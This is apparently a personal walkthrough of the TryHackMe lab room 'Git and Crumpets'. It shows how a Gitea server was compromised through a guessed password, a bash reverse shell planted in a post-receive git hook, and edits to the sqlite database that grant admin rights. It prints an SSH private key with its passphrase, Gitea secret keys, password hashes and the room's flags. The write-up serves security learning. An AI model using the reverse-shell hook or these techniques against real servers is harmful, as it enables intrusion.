# Tryhackme.com Room : Git and Crumpets

`https://tryhackme.com/room/gitandcrumpets`

## Instance

```bash
export IP="10.10.187.192"
```

## Nmap

```
22/tcp   open   ssh        OpenSSH 8.0 (protocol 2.0)
80/tcp   open   http       nginx
9090/tcp closed zeus-admin
```



## Initial foothold

When we try to reach port `80` we are redirected to a rick roll video on youtube..

If we `curl -v $IP` we get a `301` redirection to the youtube video and the following body:

```
<h1>Nothing to see here, move along</h1>
<h2>Notice:</h2>                                                                                                         
<p>
Hey guys,
I set up the dev repos at git.git-and-crumpets.thm, but I haven't gotten around to setting up the DNS yet.
In the meantime, here's a fun video I found!     
Hydra
</p>
```

With a rickroll ascii art.

We find the potential user

```
hydra
```

We set the domain `git-and-crumpets.thm` and the subdomain `git.git-and-crumpets.thm` in our host file



`http://git.git-and-crumpets.thm/` resolve to a `gitea` instance.

Looking at the source, we see that it's `gitea version 1.14.0`

Doesn't seem like there is any exploits for this version of `gitea`



We can register a user an browse the public repos.

We find the users

```
hydra
root (groot)
scones
test
```

And the repos

```
hydra/hello-world
	Single commit, nothing in there
scones/cant-touch-this
	Which have 5 commits
```

Here are the commit messages

```
Delete License
Delete Passwords File (I kept the password in my avatar to be more secure.)
Add passwords 
Update 'README.md' 
Initial commit
```

We then download `scones` avatar and run `exiftool` on it. We find :

```
Description                     : My 'Password' should be easy enough to guess
```

We just try the password `Password` with the user `scones` and it work.

Doesn't seem to give us anything tho, we see the same repos/users.

Tried to extract passwords from other users avatar without success.

Tried to login via `ssh` with `scones:Password` without success.



After running in circle for a while, I decided to peak at a writeup to get an hint.

The writeup mention `git-hooks`.

Let's look into it.

The user that we created probably don't have right to create `hooks` but the `scones` user does.

We create a new repo, then in `settings -> git hooks -> post-receive` we set a revshell payload :

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.6.32.20/9001 0>&1
```

We then init our repo and push something. We get a revshell as `git` user



We find `/home/git/user.txt` (Which is base64 encoded) :

```
thm{fd7ab9ffd409064f257cd70cf3d6aa16}
```



Now we can add ourselves to the `/home/git/.ssh/authorized_keys` and login via `ssh`

## Priv esc

We are now user `git`

We can't `sudo -l`

We don't have access to `wget` or `curl` but we have `python3` so we write a little helper script to download files :

```
import os,sys
import urllib.request
f = open(os.path.basename (sys.argv[2]), 'wb')
f.write(urllib.request.urlopen(sys.argv[1]).read())
f.close()
```

We can now download file with `python3 dl.py http://{url} {filename}`



Doesn't seem to be any `cron` jobs running. I did run `pspy` and nothing seems to be running.

I did also run `linpeas.sh` but didn't find anything interesting



Browsing around, we find the `gitea` config file in `/etc/gitea/app.ini` :

```
[security]
INTERNAL_TOKEN     = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYmYiOjE2MTgzODY1NzF9.Ji9cW44tpPJwDmkq-rZawLBIy7YBLCTSdZsvl3cilW4
INSTALL_LOCK       = true
SECRET_KEY         = Dssc6mJp6GeDGzAdlikWML6QZ17J9bfl9Cg2QyLq4DZIZDoa3KbgDjDLI4X3IpnS
PASSWORD_HASH_ALGO = pbkdf2
DISABLE_GIT_HOOKS = false

[database]
DB_TYPE  = sqlite3
HOST     = 127.0.0.1:3306
NAME     = gitea
USER     = gitea
PASSWD   = 
SCHEMA   = 
SSL_MODE = disable
CHARSET  = utf8
PATH     = /var/lib/gitea/data/gitea.db
LOG_SQL  = false
```

We retrieve the `gitea` database. We get the hashes for all users :

```
user:hash:salt
hydra:9b020d3e158bc31b5fe64d668d94cab38cadc6721a5fdf7a4b1fb7bf97021c5e68f56bd9bd44d5ce9547e5e234086342c4e4:3C4NzJWN9e
root:2181d2b5fbf1859db426bcb94d97851d9a0e87a5eb47c5edc7f92bffc45b679e554c8367084f379e59936b68c0d770823ec9:5e5xPrzvBr
```

After a while trying to figure out how to crack these hash, I gave up and went back to the writeup for another hint.

The writeup mention modifying the `sqlite` db to give our user the admin rights.

So let's do this.

Now we have access to a `site administration` menu. In there we can browse all repos.

We see a private repo `root/backup` which has 2 branches and 4 commits on the `dotfiles` branch.

Looking at the commit history, we see that the `ssh key` has been commited "by mistake". We can then grab it :

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
f+V62ikG7042lp/fhTYiDgRfvXA=
-----END OPENSSH PRIVATE KEY-----
```

The key is protected by a passphrase. Let's crack it with `john the ripper`

Well, couldn't crack it with `john`. Going back on `gitea` we see that the private key file is named `Sup3rS3cur3` and this is indeed the password.

We find `/root/root.txt` :

```
thm{6320228dd9e315f283b75887240dc6a1}
```



## Wrap up

* This challenge was pretty `git` specific. Didn't know about those attack vectors. I learned some interesting stuff
  * `Git Hooks` can be used to exploit `gitea` or pretty much any `git` server that allow for server-side `hooks`
* If you can, always try to give yourself `admin` priviledges. Might allow for more actions.
* Pay attention to details, the fact that the passphrase for the ssh key was the filename didn't click with me. I jumped to cracking the passphrase without trying to find some hints first.

